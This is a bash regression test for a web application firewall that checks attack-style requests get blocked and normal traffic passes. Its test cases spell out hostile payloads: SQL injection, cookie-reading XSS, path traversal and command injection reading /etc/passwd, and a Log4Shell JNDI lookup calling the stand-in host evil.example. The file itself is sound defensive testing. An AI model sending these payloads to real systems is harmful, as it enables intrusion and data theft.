#!/bin/bash
# WAF regression test: attack-style requests must be blocked, normal ones must
# pass. Run it after any change to the WAF config or exclusions.
#
#   ./waf/test-waf.sh                          # production (https://ft.natscho.my)
#   ./waf/test-waf.sh https://localhost:8443 https://localhost:9443/api   # make security
#   RATE=1 ./waf/test-waf.sh                   # also test rate limiting (prod only;
#                                              # throttles your own IP for ~1 minute)
#
# Exit code 0 = every check passed.

PAGES=${1:-https://ft.natscho.my}
API=${2:-https://ft.natscho.my/api}
pass=0; fail=0

check() { # description, expected status regex, curl args...
	local desc=$1 want=$2; shift 2
	local got
	got=$(curl -sk -o /dev/null -w '%{http_code}' -m 20 "$@")
	if [[ $got =~ ^($want)$ ]]; then
		pass=$((pass + 1)); printf '  ok    %-58s %s\n' "$desc" "$got"
	else
		fail=$((fail + 1)); printf '  FAIL  %-58s got %s, want %s\n' "$desc" "$got" "$want"
	fi
}

echo "== Normal traffic must pass"
check "page: /login"                               200 "$PAGES/login"
check "API, not logged in: /trees/my-trees"        401 "$API/trees/my-trees"
check "API, JSON body: POST /auth/login {}"        400 -X POST -H 'Content-Type: application/json' -d '{}' "$API/auth/login"
check "API, CORS preflight"                         '20[04]' -X OPTIONS -H "Origin: $PAGES" -H 'Access-Control-Request-Method: POST' "$API/auth/login"

echo "== Attacks must be blocked (403)"
check "SQL injection in query (API)"               403 "$API/trees/search?q=smith%27%20OR%20%271%27=%271"
check "SQL injection in JSON body (API)"           403 -X POST -H 'Content-Type: application/json' -d "{\"accessToken\":\"x' UNION SELECT password FROM users--\"}" "$API/auth/login"
check "XSS in query (pages)"                       403 "$PAGES/login?q=%3Cscript%3Ealert(1)%3C/script%3E"
check "XSS in JSON body (API)"                     403 -X POST -H 'Content-Type: application/json' -d '{"message":"<script>alert(document.cookie)</script>"}' "$API/feedback"
check "Path traversal (encoded)"                   '403|400' --path-as-is "$API/..%2f..%2f..%2fetc%2fpasswd"
check "OS command injection"                       403 "$API/trees/search?q=%3Bcat%20%2Fetc%2Fpasswd"
check "Log4Shell-style JNDI lookup in header"      403 -H 'User-Agent: ${jndi:ldap://evil.example/a}' "$API/trees/my-trees"
check "Known scanner user agent (sqlmap)"          403 -A 'sqlmap/1.7' "$API/trees/my-trees"

echo "== Protocol hardening (API)"
check "Method not allowed (PROPFIND)"              '403|405' -X PROPFIND "$API/trees/my-trees"
check "Non-JSON content type (XML)"                403 -X POST -H 'Content-Type: application/xml' -d '<a>1</a>' "$API/auth/login"
check "Body over 1 MB"                             413 -X POST -H 'Content-Type: application/json' --data-binary @<(head -c 2000000 /dev/zero | tr '\0' 'a' | sed 's/^/{"a":"/;s/$/"}/') "$API/feedback"

echo "== No way around the WAF"
check "Backend port 4000 not reachable"            000 --connect-timeout 5 "${PAGES%/}:4000/"
check "Frontend port 3000 not reachable"           000 --connect-timeout 5 "${PAGES%/}:3000/"

if [ "${RATE:-0}" = 1 ]; then
	echo "== Rate limiting (sends 80 fast requests; your IP is throttled briefly afterwards)"
	codes=$(for i in $(seq 1 80); do curl -s -o /dev/null -w '%{http_code}\n' -m 10 "$API/trees/my-trees" & done; wait)
	n429=$(grep -c '^429$' <<< "$codes")
	if [ "$n429" -gt 0 ]; then pass=$((pass + 1)); echo "  ok    burst of 80 requests: $n429 got 429 Too Many Requests"
	else fail=$((fail + 1)); echo "  FAIL  burst of 80 requests: none got 429"; fi
fi

echo
echo "RESULT: $pass passed, $fail failed"
[ "$fail" -eq 0 ]
